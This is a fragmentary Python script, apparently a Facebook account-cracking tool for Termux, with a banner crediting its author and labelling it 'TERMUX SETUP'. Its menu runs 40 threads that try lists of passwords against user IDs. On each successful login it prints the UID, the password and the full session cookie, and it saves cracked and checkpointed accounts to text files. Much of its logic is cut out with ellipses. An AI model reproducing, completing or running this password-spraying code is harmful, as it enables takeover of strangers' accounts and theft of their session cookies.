...
def clear():
    os.system("clear")
    baner= os.system("figlet -f slant ARIYAN")
    baner = str(baner)
    baner = baner.replace("0","")
    print(baner)
    line()
    print("\033[1;37m[\033[38;5;46m+\033[1;37m] AUTHOR   : ARIYAN HRIDOYE ")
    print("\033[1;37m[\033[38;5;46m+\033[1;37m] GITHUB   : ariyan5140 ")
    print("\033[1;37m[\033[38;5;46m+\033[1;37m] PROJECT  : TERMUX SETUP ")
    print("\033[1;37m[\033[38;5;46m+\033[1;37m] FACEBOOK : ARIYAN HRIDOYE ")
    line()
...
def menu():
    ...
    os.geteuid
    clear()
    slw("\033[38;5;46mWELCOME TO ARIYAN HRIDOYE PROJECT")
    clear()
    ...
    with ThreadPool(max_workers=40) as spd:
        ...
        print(f'\033[38;5;195m[\033[38;5;195m+\033[38;5;195m]\033[38;5;195m OK ID SAVED ARIYAN-OK.txt')
        print('\033[38;5;195m[+\033[38;5;195m] CP ID SAVED ARIYAN-CP.txt ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r \033[38;5;195m[ARIYAN-OK 🖤] \033[38;5;46m'+uid+'\033[38;5;195m | \033[38;5;46m' +ps+    '  \n\033[38;5;195m[COOKIE- 🍪\033[38;5;195m] = \033[38;5;46m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\033[38;5;195mARIYAN-CP 💔 \x1b[38;5;208m' +uid+ ' \033[38;5;195m| '+'\x1b[38;5;208m '+ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} \033[38;5;195m[{xr}ARIYAN-XD{x}]%s|%s]OK-{xr}%s{x}'%(H,loop,total,len(oks))),
        sys.stdout.flush()
    except:
        pass
